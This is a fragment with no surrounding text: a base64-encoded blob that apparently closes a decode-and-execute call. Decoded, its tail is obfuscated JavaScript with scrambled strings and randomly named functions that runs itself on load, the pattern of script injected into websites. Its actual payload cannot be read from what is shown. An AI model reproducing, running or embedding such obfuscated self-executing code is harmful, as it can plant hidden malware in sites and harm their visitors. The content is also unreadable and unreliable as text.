xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
